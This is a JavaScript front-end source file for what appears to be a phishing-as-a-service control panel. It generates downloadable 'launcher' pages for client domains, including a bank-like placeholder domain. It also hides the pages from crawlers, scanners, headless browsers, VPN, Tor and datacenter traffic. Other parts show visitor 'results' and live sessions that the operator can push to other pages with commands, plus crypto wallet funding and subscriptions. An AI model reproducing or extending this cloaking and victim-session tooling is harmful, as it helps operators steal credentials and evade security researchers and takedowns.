          <p>Download after the live domain, relay secret, and managed Worker route are set. Upload this smart launcher once as index.html; CAPTCHA changes then load automatically on the next visitor refresh. Download again only when the launcher code itself changes.</p>
          <div class="admin-rule-list">
            ${isRenderStatic ? `
              <div><strong>1</strong><span>Download the generated index.html from this step.</span></div>
              <div><strong>2</strong><span>Upload or commit it to the static host root/publish folder.</span></div>
              <div><strong>3</strong><span>Connect ${domain || "clientdomain.com"} as the custom domain.</span></div>
              <div><strong>4</strong><span>Visitors must use ${domain || "clientdomain.com"} only. The raw host URL is treated as unauthorized.</span></div>
            ` : `
              <div><strong>1</strong><span>Download the generated index.html from this step.</span></div>
              <div><strong>2</strong><span>Go to ${installPath || "public_html"} or the domain document root.</span></div>
              <div><strong>3</strong><span>Upload the generated index.html. Visitors should open https://${domain || "clientdomain.com"}/.</span></div>
              <div><strong>4</strong><span>Add DirectoryIndex and /index.html redirect rules if the host exposes the filename.</span></div>
            `}
          </div>
          <div class="admin-actions">
            <button type="button" data-download-index="${routeKey}" title="${escapeHtml(readyToDownload ? "Download the final launcher as index.html" : `Complete: ${downloadBlockers.join(", ")}`)}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
          </div>
          <p class="go-live-download-state ${readyToDownload ? "is-ready" : "is-blocked"}">${readyToDownload ? "Ready: the final launcher can now be downloaded." : `Download unavailable. Complete: ${escapeHtml(downloadBlockers.join(", "))}.`}</p>
        </article>

        <article class="security-panel package-form go-live-step-card ${hasRenderOrigin ? "is-complete" : page.generatedFile?.lastGeneratedAt ? "is-active" : ""}">
          <small>step 5</small>
          <h3>Add raw host URL</h3>
          <p>After deploying the downloaded index.html, enter the temporary/default URL supplied by Netlify, DigitalOcean, or your static host. The live domain remains ${displayDomain}.</p>
          <label><span>Raw host URL</span><input type="url" data-hosting-field="serverIp" value="${serverIp}" placeholder="https://your-static-host.example.com"></label>
          <div class="admin-actions">
            <button type="button" data-save-hosting="${routeKey}">Save host URL</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${hasVerified ? "is-complete" : hasRenderOrigin && page.generatedFile?.lastGeneratedAt && hasWorkerRoute ? "is-active" : ""}">
          <small>step 6</small>
          <h3>Connect custom domain</h3>
          <p>Point ${displayDomain} to the static host. The raw host URL stays as the origin and should not be shared as the live link.</p>
          <div class="admin-rule-list">
            ${isRenderStatic ? `
              <div><strong>1</strong><span>Upload the generated index.html to your static host.</span></div>
              <div><strong>2</strong><span>Connect ${displayDomain} as the custom domain.</span></div>
              <div><strong>3</strong><span>In Cloudflare, keep the DNS record proxied so Worker route ${workerRoute} runs.</span></div>
              <div><strong>4</strong><span>The raw host URL is unauthorized by the generated page.</span></div>
            ` : `
              <div><strong>1</strong><span>Point the domain to the hosting account.</span></div>
              <div><strong>2</strong><span>Keep the Worker route active in Cloudflare.</span></div>
              <div><strong>3</strong><span>Visitors should open https://${displayDomain}/.</span></div>
              <div><strong>4</strong><span>Do not use alternate hostnames for the live page.</span></div>
            `}
          </div>
          <div class="admin-actions">
            <button type="button" data-verify-hosting="${routeKey}" ${hasDomain && hasRenderOrigin && page.generatedFile?.lastGeneratedAt && hasWorkerRoute ? "" : "disabled"}>Mark connection verified</button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} HOSTING SETUP READY`;
  topbarTitle.textContent = `${page.name} Go Live`;
}

function renderUserConfigCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const subscription = page.subscription || {};
  const hosting = page.hostingConfig || {};
  const resultSettings = page.resultSettings || {};
  const routeKey = pageRouteKey(page);
  const domain = hosting.domain || page.domain || "";
  const planLabel = subscription.billingPeriod ? billingLabel(subscription.billingPeriod) : "Not set";
  const renewalPrice = formatMoney(subscription.renewalPrice || 0);
  const renewalDate = subscription.renewalDate || "Not scheduled";
  const liveStatus = hosting.liveStatus || (hosting.verified ? "Live" : "Setup needed");

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>page config</small>
        <h2>${page.name} configuration</h2>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#security-${routeKey}:security`, "Security"),
        routeButton(`#results-${routeKey}`, "Results"),
        routeButton(`#go-live-${routeKey}`, "Go Live")
      ])}

      <div class="summary-grid config-summary">
        <article><small>Domain</small><b>${escapeHtml(domain || "Not set")}</b><span>Live host</span></article>
        <article><small>Plan</small><b>${escapeHtml(planLabel)}</b><span>${escapeHtml(renewalPrice)} renewal</span></article>
        <article><small>Renewal</small><b>${escapeHtml(renewalDate)}</b><span>${subscription.autoRenew ? "Auto-renew on" : "Auto-renew off"}</span></article>
        <article><small>Status</small><b>${escapeHtml(liveStatus)}</b><span>${page.securityConfig?.captcha ? "Captcha on" : "Captcha off"}</span></article>
      </div>

      <div class="package-editor-grid">
        <article class="security-panel package-form">
          <small>domain</small>
          <h3>Page identity</h3>
          <label><span>Primary domain</span><input type="text" data-user-config="domain" value="${escapeHtml(domain)}" placeholder="clientdomain.com"></label>
          <p>This domain is used for the hosted page and allowed-host security checks.</p>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${routeKey}">Save config</button>
            <button type="button" data-go-live="${routeKey}">Go Live</button>
          </div>
        </article>

        <article class="security-panel package-form">
          <small>subscription</small>
          <h3>Renewal behavior</h3>
          <label class="toggle-row">
            <input type="checkbox" data-user-config="autoRenew" ${subscription.autoRenew ? "checked" : ""}>
            <span>Auto-renew from wallet</span>
          </label>
          <div class="feature-row">
            <span>${escapeHtml(planLabel)}</span>
            <span>${escapeHtml(renewalPrice)}</span>
            <span>${escapeHtml(renewalDate)}</span>
          </div>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${routeKey}">Save renewal</button>
            <button type="button" data-route="#wallet">Wallet</button>
          </div>
        </article>

        <article class="security-panel package-form">
          <small>results</small>
          <h3>Result handling</h3>
          <label><span>Keep results for</span><input type="number" min="1" max="3650" data-user-config="retentionDays" value="${escapeHtml(resultSettings.retentionDays || 30)}"></label>
          <label class="toggle-row">
            <input type="checkbox" data-user-config="notifyOnResult" ${resultSettings.notifyOnResult ? "checked" : ""}>
            <span>Notify me when a new result arrives</span>
          </label>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${routeKey}">Save results</button>
            <button type="button" data-results="${routeKey}">Open results</button>
          </div>
        </article>

        <article class="security-panel package-form">
          <small>quick controls</small>
          <h3>Page operations</h3>
          <div class="admin-compact-grid">
            <button type="button" data-security="${routeKey}" data-security-tab="security"><strong>Security</strong><span>Captcha and device rules</span></button>
            <button type="button" data-security="${routeKey}" data-security-tab="traffic"><strong>Traffic</strong><span>Visits and blocks</span></button>
            <button type="button" data-results="${routeKey}"><strong>Results</strong><span>Submissions and sessions</span></button>
            <button type="button" data-go-live="${routeKey}"><strong>Go Live</strong><span>Hosting and download</span></button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} USER CONFIG READY`;
  topbarTitle.textContent = `${page.name} Config`;
}

function formatTrafficTime(value) {
  if (!value) return "--";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return String(value).slice(0, 12);
  return date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
}

function formatTrafficDate(value) {
  if (!value) return "unknown date";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return String(value).slice(0, 16);
  return date.toLocaleDateString([], { month: "short", day: "numeric" });
}

const trafficDeviceLabels = {
  mobile: "Mobile",
  desktop: "PC",
  tablet: "Tablet",
  bot: "Bot / crawler",
  other: "Other"
};

function detectTrafficDeviceType(event = {}) {
  const storedType = event.metadata?.deviceType || event.deviceType;
  if (trafficDeviceLabels[storedType]) return storedType;
  const agent = String(event.userAgent || "").toLowerCase();
  if (!agent) return "other";
  if (/bot|crawler|spider|slurp|headless|preview|scanner|curl|wget|python-requests|httpclient/.test(agent)) return "bot";
  if (/ipad|tablet|kindle|silk|playbook/.test(agent)) return "tablet";
  if (/mobi|android|iphone|ipod|phone|blackberry|opera mini|windows phone/.test(agent)) return "mobile";
  if (/windows nt|macintosh|linux x86_64|x11|cros/.test(agent)) return "desktop";
  return "other";
}

function trafficInsights(trafficLog = []) {
  const counts = { mobile: 0, desktop: 0, tablet: 0, bot: 0, other: 0 };
  const buckets = new Map();
  let allowed = 0;
  let blocked = 0;

  trafficLog.forEach((event) => {
    const deviceType = detectTrafficDeviceType(event);
    counts[deviceType] = (counts[deviceType] || 0) + 1;
    if (event.result === "blocked") blocked += 1;
    else allowed += 1;

    const date = new Date(event.createdAt || event.time);
    if (Number.isNaN(date.getTime())) return;
    const hour = new Date(date);
    hour.setMinutes(0, 0, 0);
    const key = hour.toISOString();
    const label = hour.toLocaleTimeString([], { hour: "2-digit" });
    const current = buckets.get(key) || { key, label, total: 0 };
    current.total += 1;
    buckets.set(key, current);
  });

  const graph = [...buckets.values()]
    .sort((a, b) => a.key.localeCompare(b.key))
    .slice(-10);
  const maxGraphValue = Math.max(1, ...graph.map((bucket) => bucket.total));

  return {
    counts,
    allowed,
    blocked,
    graph,
    maxGraphValue,
    total: trafficLog.length
  };
}

function trafficCategoryCardsMarkup(insights) {
  return Object.entries(trafficDeviceLabels).map(([type, label]) => `
    <article class="traffic-category-card ${type}">
      <span>${escapeHtml(label)}</span>
      <strong>${insights.counts[type] || 0}</strong>
    </article>
  `).join("");
}

function trafficGraphMarkup(insights) {
  if (!insights.graph.length) {
    return `<div class="traffic-chart empty"><span>No graph data yet</span></div>`;
  }
  return `
    <div class="traffic-chart" aria-label="Traffic graph">
      ${insights.graph.map((bucket) => `
        <div class="traffic-bar" title="${escapeHtml(bucket.label)} / ${bucket.total}">
          <i style="height: ${Math.max(8, Math.round((bucket.total / insights.maxGraphValue) * 100))}%"></i>
          <span>${escapeHtml(bucket.label)}</span>
        </div>
      `).join("")}
    </div>
  `;
}

function trafficRowsMarkup(trafficLog, pageSlug, bannedIps = [], whitelistIps = []) {
  if (!trafficLog.length) {
    return `
      <article class="empty-state traffic-empty">
        <h3>No traffic yet</h3>
        <p>Open the live hosted page once, then return here. Visits, screens, allowed/blocked decisions, and IPs will appear in this panel.</p>
      </article>
    `;
  }

  return trafficLog.map((event) => {
    const ip = event.ip || "";
    const deviceType = detectTrafficDeviceType(event);
    const isBanned = bannedIps.includes(ip);
    const isWhitelisted = whitelistIps.includes(ip);
    const status = isBanned ? "Banned" : isWhitelisted ? "Whitelisted" : event.result || event.event || "Visit";
    return `
      <div>
        <span>${escapeHtml(formatTrafficTime(event.createdAt || event.time))}</span>
        <strong>${escapeHtml(ip || "unknown ip")}</strong>
        <mark class="traffic-device ${escapeHtml(deviceType)}">${escapeHtml(trafficDeviceLabels[deviceType] || "Other")}</mark>
        <em class="${isBanned ? "is-banned" : isWhitelisted ? "is-whitelisted" : ""}">${escapeHtml(status)}</em>
        <section class="traffic-actions" aria-label="Traffic IP actions">
          <button type="button" data-traffic-ban-ip="${escapeHtml(ip)}" data-traffic-page="${escapeHtml(pageSlug)}" ${ip && !isBanned ? "" : "disabled"}>Ban</button>
          <button type="button" data-traffic-whitelist-ip="${escapeHtml(ip)}" data-traffic-page="${escapeHtml(pageSlug)}" ${ip && !isWhitelisted ? "" : "disabled"}>Whitelist</button>
        </section>
        <small>${escapeHtml([
          event.event || "page_load",
          event.screen || event.path || "",
          event.hostname || "",
          formatTrafficDate(event.createdAt)
        ].filter(Boolean).join(" / "))}</small>
      </div>
    `;
  }).join("");
}

function pageLogStatus(event = {}) {
  const reason = String(event.reason || "").toLowerCase();
  if (event.result === "blocked" || reason.includes("blocked") || reason.includes("banned")) return "blocked";
  if (reason.includes("verified") || reason.includes("passed") || reason.includes("allowed") || reason.includes("whitelisted")) return "allowed";
  return event.result || "event";
}

function pageLogExplanation(event = {}) {
  const reason = String(event.reason || "").trim();
  const reasonLower = reason.toLowerCase();
  const deviceType = detectTrafficDeviceType(event);
  const deviceLabel = trafficDeviceLabels[deviceType] || "Other";
  const proxyType = event.metadata?.proxyType;
  const ip = event.ip || "unknown IP";

  if (reasonLower.includes("banned ip") || reasonLower.includes("ip blocked")) {
    return `Blocked because ${ip} is on this page's banned IP list.`;
  }
  if (reasonLower.includes("whitelisted")) {
    return `Allowed because ${ip} is on this page's whitelist.`;
  }
  if (reasonLower.includes("devices are blocked")) {
    return `Blocked because ${deviceLabel.toLowerCase()} traffic is disabled for this page.`;
  }
  if (reasonLower.includes("vpn") || reasonLower.includes("proxy")) {
    return `Blocked because the request looked like VPN or proxy traffic${proxyType ? ` (${proxyType})` : ""}.`;
  }
  if (reasonLower.includes("tor")) {
    return "Blocked because the request looked like Tor traffic.";
  }
  if (reasonLower.includes("hosting provider")) {
    return "Blocked because the request came from a hosting or datacenter network.";
  }
  if (reasonLower.includes("subscription")) {
    return "Blocked because the page subscription is not active.";
  }
  if (reasonLower.includes("turnstile") || reasonLower.includes("verified")) {
    return reasonLower.includes("passed") || reasonLower.includes("verified")
      ? "Human verification passed."
      : "Human verification did not pass.";
  }
  if (event.result === "blocked") {
    return reason && reason !== "ACCESS DENIED"
      ? `Blocked by page security: ${reason}.`
      : "Blocked by page security. Visitors only see ACCESS DENIED.";
  }
  if (event.event === "page_load") {
    return "Page loaded and the visitor passed the current access checks.";
  }
  if (event.event === "security_check") {
    return "Security check completed for this visitor.";
  }
  return reason && reason !== "ACCESS DENIED" ? reason : "Page activity recorded.";
}

function pageLogRowsMarkup(trafficLog) {
  if (!trafficLog.length) {
    return `
      <article class="empty-state traffic-empty">
        <h3>No page log yet</h3>
        <p>Open the hosted page once. Access checks, denied visits, device blocks, IP decisions, and verification events will appear here.</p>
      </article>
    `;
  }

  return trafficLog.map((event) => {
    const status = pageLogStatus(event);
    const deviceType = detectTrafficDeviceType(event);
    const detailLine = [
      event.ip || "unknown ip",
      trafficDeviceLabels[deviceType] || "Other",
      event.hostname || "unknown host",
      event.path || event.screen || event.event || "page event"
    ].filter(Boolean).join(" / ");
    return `
      <article class="page-log-entry ${escapeHtml(status)}">
        <time>${escapeHtml(formatTrafficTime(event.createdAt || event.time))}</time>
        <div>
          <strong>${escapeHtml(status === "blocked" ? "Access denied" : status === "allowed" ? "Allowed" : "Activity")}</strong>
          <p>${escapeHtml(pageLogExplanation(event))}</p>
          <small>${escapeHtml(detailLine)} / ${escapeHtml(formatTrafficDate(event.createdAt))}</small>
        </div>
      </article>
    `;
  }).join("");
}

function ipRuleRowsMarkup(ips = [], pageSlug, label) {
  if (!ips.length) {
    return `<p class="ip-rule-empty">No ${escapeHtml(label.toLowerCase())} saved yet.</p>`;
  }
  return `
    <div class="ip-rule-list">
      ${ips.map((ip) => `
        <div class="ip-rule-row">
          <strong>${escapeHtml(ip)}</strong>
          <button type="button" data-security-remove-ip="${escapeHtml(ip)}" data-security-page="${escapeHtml(pageSlug)}">Remove</button>
        </div>
      `).join("")}
    </div>
  `;
}

async function fetchPageTraffic(page) {
  try {
    const result = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/traffic?limit=100`);
    return result.trafficEvents || [];
  } catch (error) {
    statusText.textContent = `TRAFFIC LOAD FAILED: ${error.message}`.toUpperCase();
    return page.securityConfig?.trafficLog || [];
  }
}

async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
  activeFlowSlug = null;
  tab = tab === "domains" ? "security" : tab;
  tab = tab === "page-log" ? "log" : tab;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const routeKey = pageRouteKey(page);
  const security = page.securityConfig;
  const turnstile = security.turnstile || {};
  const bannedIps = security.bannedIps || [];
  const whitelistIps = security.whitelistIps || [];
  const blockedDevices = security.blockedDevices || [];
  const vpnProxyRules = security.vpnProxyRules || {};
  const trafficLog = ["traffic", "log"].includes(tab) ? await fetchPageTraffic(page) : security.trafficLog || [];
  const trafficStats = trafficInsights(trafficLog);
  const tabButtons = [
    routeButton(`#security-${routeKey}:security`, "Security", tab === "security" ? "primary" : ""),
    routeButton(`#security-${routeKey}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
    routeButton(`#security-${routeKey}:traffic`, "Traffic", tab === "traffic" ? "primary" : ""),
    routeButton(`#security-${routeKey}:log`, "Log", tab === "log" ? "primary" : "")
  ];
  const captchaPanel = `
    <article class="security-panel">
      <small>captcha</small>
      <h3>Cloudflare Turnstile</h3>
      <label class="toggle-row">
        <input type="checkbox" data-security-field="captcha" ${security.captcha ? "checked" : ""}>
        <span>Enable Turnstile challenge before form submission</span>
      </label>
      <label>
        <span>Turnstile site key</span>
        <input type="text" data-security-field="turnstileSiteKey" value="${escapeHtml(turnstile.siteKey || security.turnstileSiteKey || "")}" placeholder="0x4AAAA...">
      </label>
      <label>
        <span>Turnstile secret key</span>
        <input type="password" data-security-field="turnstileSecretKey" value="" placeholder="${turnstile.secretConfigured || security.turnstileSecretConfigured ? "Secret configured — enter only to replace" : "Enter secret key"}">
      </label>
      <label>
        <span>Display Domain</span>
        <input type="text" data-security-field="turnstileDisplayDomain" value="${escapeHtml(turnstile.displayDomain || "")}" placeholder="online-cashpro.help">
      </label>
      <p>${turnstile.secretConfigured || security.turnstileSecretConfigured ? "Secret is configured server-side. Enter a value only to replace it." : "No server-side secret is configured yet."}</p>
      <div class="manage-actions">
        <button type="button" data-validate-turnstile="${routeKey}">Validate configuration</button>
        <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save Turnstile</button>
      </div>
      <p data-turnstile-validation>Not validated in this session.</p>
    </article>
  `;
  const ipPanel = `
    <article class="security-panel">
      <small>ip rules</small>
      <h3>Ban and whitelist</h3>
      <label>
        <span>Banned IPs</span>
        <textarea data-security-field="bannedIps">${bannedIps.join("\n")}</textarea>
      </label>
      ${ipRuleRowsMarkup(bannedIps, routeKey, "Banned IPs")}
      <label>
        <span>Whitelisted IPs</span>
        <textarea data-security-field="whitelistIps">${whitelistIps.join("\n")}</textarea>
      </label>
      ${ipRuleRowsMarkup(whitelistIps, routeKey, "Whitelisted IPs")}
      <button type="button" data-save-security="${routeKey}" data-save-security-tab="ips">Save IP rules</button>
    </article>
  `;
  const devicePanel = `
    <article class="security-panel">
      <small>device rules</small>
      <h3>Block device types</h3>
      <div class="device-rule-list">
        ${[
          ["mobile", "Mobile users", "Phones and small mobile browsers"],
          ["desktop", "PC users", "Windows, macOS, Linux desktop browsers"],
          ["tablet", "Tablet users", "iPad, Android tablets, Kindle/Silk"],
          ["bot", "Bots and scanners", "Crawler, spider, headless, scanner user agents"],
          ["other", "Other devices", "Unknown or unclassified user agents"]
        ].map(([value, label, hint]) => `
          <label class="device-rule">
            <input type="checkbox" data-security-device="${value}" ${blockedDevices.includes(value) ? "checked" : ""}>
            <span>
              <strong>${label}</strong>
              <small>${hint}</small>
            </span>
          </label>
        `).join("")}
      </div>
      <p>Best protection is server-side User-Agent detection through your runtime API. It blocks common device classes, but advanced users can spoof their browser, so pair this with IP rules and captcha for stronger control.</p>
      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save security rules</button>
    </article>
  `;
  const proxyPanel = `
    <article class="security-panel">
      <small>vpn / proxy shield</small>
      <h3>Block masked traffic</h3>
      <div class="device-rule-list">
        ${[
          ["blockVpnProxies", "Block VPN and proxy traffic", "Uses runtime headers plus IP reputation checks"],
          ["blockTor", "Block Tor exits", "Blocks Cloudflare Tor signals and reputation-marked Tor requests"],
          ["blockHostingProviders", "Block hosting/datacenter IPs", "Uses IP reputation to block server/datacenter traffic"]
        ].map(([field, label, hint]) => `
          <label class="device-rule">
            <input type="checkbox" data-security-proxy="${field}" ${vpnProxyRules[field] ? "checked" : ""}>
            <span>
              <strong>${label}</strong>
              <small>${hint}</small>
            </span>
          </label>
        `).join("")}
      </div>
      <label>
        <span>When reputation providers are unavailable</span>
        <select data-security-failure-mode>
          <option value="challenge" ${(vpnProxyRules.reputationFailureMode || "challenge") === "challenge" ? "selected" : ""}>Require Turnstile (recommended)</option>
          <option value="block" ${vpnProxyRules.reputationFailureMode === "block" ? "selected" : ""}>Block access</option>
          <option value="allow" ${vpnProxyRules.reputationFailureMode === "allow" ? "selected" : ""}>Allow and log</option>
        </select>
      </label>
      <p>Challenge mode requires a valid Turnstile site and secret key. Provider failures are cached briefly, while successful reputation results use the normal cache.</p>
      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save shield</button>
    </article>
  `;
  const trafficPanel = `
    <article class="security-panel security-panel-wide">
      <div class="builder-heading">
        <div>
          <small>traffic</small>
          <h3>Visits and block counts</h3>
        </div>
        <button type="button" data-route="#security-${routeKey}:traffic">Refresh</button>
      </div>
      <div class="metric-grid">
        <div><span>Total events</span><b>${trafficStats.total}</b></div>
        <div><span>Allowed</span><b>${trafficStats.allowed}</b></div>
        <div><span>Blocked</span><b>${trafficStats.blocked}</b></div>
      </div>
      <div class="traffic-dashboard">
        <section class="traffic-category-grid" aria-label="Traffic categories">
          ${trafficCategoryCardsMarkup(trafficStats)}
        </section>
        ${trafficGraphMarkup(trafficStats)}
      </div>
      <div class="traffic-log">
        ${trafficRowsMarkup(trafficLog, routeKey, bannedIps, whitelistIps)}
      </div>
    </article>
  `;
  const pageLogPanel = `
    <article class="security-panel security-panel-wide">
      <div class="builder-heading">
        <div>
          <small>page log</small>
          <h3>What happened on this page</h3>
        </div>
        <button type="button" data-route="#security-${routeKey}:log">Refresh</button>
      </div>
      <p>This log explains the real owner-side reason behind page activity. Visitors still only see ACCESS DENIED when a rule blocks them.</p>
      <div class="metric-grid">
        <div><span>Total events</span><b>${trafficStats.total}</b></div>
        <div><span>Allowed</span><b>${trafficStats.allowed}</b></div>
        <div><span>Denied</span><b>${trafficStats.blocked}</b></div>
      </div>
      <div class="page-log-list">
        ${pageLogRowsMarkup(trafficLog)}
      </div>
    </article>
  `;
  const panels = tab === "traffic"
    ? trafficPanel
    : tab === "log"
        ? pageLogPanel
    : tab === "ips"
        ? ipPanel
        : `${captchaPanel}${devicePanel}${proxyPanel}`;

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>security center</small>
        <h2>${page.name} protection</h2>
        <p>Manage the rules that protect this page after users download and host the generated index.html.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#results-${routeKey}`, "Results"),
        routeButton("#wallet", "Wallet")
      ])}
      ${viewNav(tabButtons)}

      <div class="security-grid">
        ${panels}
      </div>
    </section>
  `;

  statusText.textContent = `${tab.toUpperCase()} RULES READY`;
  topbarTitle.textContent = `${page.name} Security`;
}

async function renderResultsCenter(pageSlug = "page-a", options = {}) {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const routeKey = pageRouteKey(page);
  const previousSearch = options.autoRefresh ? preview.querySelector("[data-session-search-input]")?.value || "" : "";
  const previousFilter = options.autoRefresh ? preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "live" : "live";
  const previouslySelectedResultIds = options.autoRefresh
    ? [...preview.querySelectorAll("[data-result-select]:checked")].map((input) => input.dataset.resultSelect).filter(Boolean)
    : [];
  const openSessionIds = options.autoRefresh
    ? [...preview.querySelectorAll("[data-compact-session][open]")]
        .map((row) => row.dataset.compactSession)
        .filter(Boolean)
    : [];
  await loadResultsControlData(page, options);
  if (options.autoRefresh) {
    if (!isResultsRoute(routeKey)) return;
    const blockReason = resultsAutoRefreshBlockReason();
    if (blockReason) {
      updateResultsAutoRefreshStatus(blockReason);
      return;
    }
  }
  const results = page.results || [];
  const savedSessions = resultSessions(results);
  const activeSessions = page.activeSessions || [];
  const activeSessionsById = new Map(activeSessions.map((session) => [session.sessionId, session]));
  const savedSessionIds = new Set(savedSessions.map((session) => session.sessionId));
  const activeSessionsWithoutResults = activeSessions.filter((session) => !savedSessionIds.has(session.sessionId));
  const compactSessions = [
    ...activeSessionsWithoutResults.map((session) => ({
      sessionId: session.sessionId,
      results: [],
      firstSeen: session.lastSeenAt,
      lastSeen: session.lastSeenAt,
      ip: session.ip || "unknown"
    })),
    ...savedSessions
  ];
  const sessionCommands = page.configs?.sessionCommands || {};
  const sessionCommandHistory = page.configs?.sessionCommandHistory || {};
  const bannedIps = page.securityConfig?.bannedIps || [];
  const whitelistIps = page.securityConfig?.whitelistIps || [];
  const pageTargets = sessionPageTargets(page);

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>page results</small>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#security-${routeKey}:security`, "Security"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="summary-grid">
        <article><small>Active users</small><b>${String(activeSessions.length).padStart(2, "0")}</b><span>Seen in last 10 minutes</span></article>
        <article><small>Total results</small><b>${String(results.length).padStart(2, "0")}</b><span>Saved for ${page.name}</span></article>
        <article><small>Banned IPs</small><b>${String(bannedIps.length).padStart(2, "0")}</b><span>Security list</span></article>
        <article><small>Whitelisted</small><b>${String(whitelistIps.length).padStart(2, "0")}</b><span>Trusted list</span></article>
      </div>

      ${resultStepCountMarkup(results)}

      <article class="security-panel compact-results-center">
        <div class="builder-heading">
          <div>
            <small>control center</small>
            <h3>Compact sessions</h3>
          </div>
          <div class="compact-center-actions">
            <span class="live-refresh-indicator${resultsAutoRefreshUserPaused ? " is-paused" : ""}" data-results-live-status aria-live="polite">${resultsAutoRefreshUserPaused ? "Live updates paused" : "Live updates on"}</span>
            <button type="button" data-toggle-results-auto-refresh="${routeKey}" aria-pressed="${resultsAutoRefreshUserPaused ? "true" : "false"}">${resultsAutoRefreshUserPaused ? "Resume live" : "Pause live"}</button>
            <button type="button" data-refresh-results="${routeKey}">Refresh</button>
            <button type="button" data-sync-result-screens="${routeKey}" title="Replace this subscription snapshot with the package's current saved screen order">${page.screenSync?.stale ? "Sync updated pages" : "Sync package pages"}</button>
            <button type="button" data-route="#security-${routeKey}:traffic">Open traffic</button>
          </div>
        </div>
        <div class="compact-session-toolbar">
          <input type="search" data-session-search-input placeholder="Search session, IP, page, command">
          <div class="compact-session-filters" aria-label="Filter result sessions">
            ${[
              ["all", "All"],
              ["live", "Active"],
              ["has-results", "With results"]
            ].map(([filter, label]) => `<button type="button" class="${filter === previousFilter ? "is-active" : ""}" data-session-filter-button="${filter}" aria-pressed="${filter === previousFilter ? "true" : "false"}">${label}</button>`).join("")}
          </div>
        </div>
        ${bulkResultsToolbarMarkup(routeKey)}
        <div class="compact-session-list" data-compact-session-list>
          ${compactSessions.length ? compactSessions.map((session) => compactSessionMarkup(session, page, bannedIps, whitelistIps, {
            activeSession: activeSessionsById.get(session.sessionId),
            command: latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory),
            pageTargets
          })).join("") : `
            <article class="active-session-card empty-session">
              <div>
                <small>empty</small>
                <h4>No live sessions or saved results yet</h4>
                <p>Open the live page and keep it active; sessions and safe result activity will appear here.</p>
              </div>
            </article>
          `}
          <article class="active-session-card empty-session compact-session-empty" data-session-empty-state hidden>
            <div>
              <small>no match</small>
              <h4>No sessions match this view</h4>
              <p>Clear the search or choose another filter.</p>
            </div>
          </article>
        </div>
      </article>
    </section>
  `;

  if (previousSearch) {
    const searchInput = preview.querySelector("[data-session-search-input]");
    if (searchInput) searchInput.value = previousSearch;
  }
  if (previousFilter !== "all" || previousSearch) {
    applyCompactSessionFilters();
  }
  openSessionIds.forEach((sessionId) => {
    const row = preview.querySelector(`[data-compact-session="${CSS.escape(sessionId)}"]`);
    if (row) row.open = true;
  });
  previouslySelectedResultIds.forEach((resultId) => {
    const input = preview.querySelector(`[data-result-select="${CSS.escape(resultId)}"]`);
    if (input) input.checked = true;
  });
  updateBulkResultsToolbar();

  startResultsAutoRefresh(routeKey);
  updateResultsAutoRefreshStatus();
  statusText.textContent = options.autoRefresh ? `${page.name.toUpperCase()} RESULTS AUTO-REFRESHED` : `${page.name.toUpperCase()} RESULTS READY`;
  topbarTitle.textContent = `${page.name} Results`;
}

function applyCompactSessionFilters() {
  const list = preview.querySelector("[data-compact-session-list]");
  if (!list) return;
  const activeFilter = preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "live";
  const search = (preview.querySelector("[data-session-search-input]")?.value || "").trim().toLowerCase();
  const rows = [...preview.querySelectorAll("[data-compact-session]")];
  let visibleCount = 0;

  rows.forEach((row) => {
    const status = (row.dataset.sessionFilter || "idle").split(/\s+/);
    const searchText = row.dataset.sessionSearch || "";
    const filterMatch = activeFilter === "all" || status.includes(activeFilter);
    const searchMatch = !search || searchText.includes(search);
    const visible = filterMatch && searchMatch;
    row.hidden = !visible;
    if (visible) visibleCount += 1;
  });

  const empty = preview.querySelector("[data-session-empty-state]");
  if (empty) empty.hidden = visibleCount > 0;
}

function walletFundingOptionByValue(value) {
  return walletFundingOptions.find((option) => option.value === value) || walletFundingOptions[0] || cryptoFundingOptions[0];
}

function walletFundingAddressMarkup(option) {
  const address = option?.address || "";
  return `
    <div class="wallet-address-card" data-wallet-address-card>
      <span>${escapeHtml(option?.label || "Crypto wallet")}</span>
      <code data-wallet-address>${address ? escapeHtml(address) : "Receiving address not configured"}</code>
      <button type="button" data-copy-wallet-address ${address ? "" : "disabled"}>Copy address</button>
    </div>
  `;
}

function walletFundingQuoteMarkup() {
  return `
    <div class="wallet-quote-card" data-wallet-quote>
      <span>Minimum funding is ${formatMoney(minimumWalletFundingUsd)}</span>
      <strong data-wallet-quote-amount>Enter an amount to calculate crypto.</strong>
      <small data-wallet-quote-rate>Quote updates from the backend before you submit.</small>
    </div>
  `;
}

function setWalletQuoteState(state, detail = "") {
  const card = preview.querySelector("[data-wallet-quote]");
  if (!card) return;
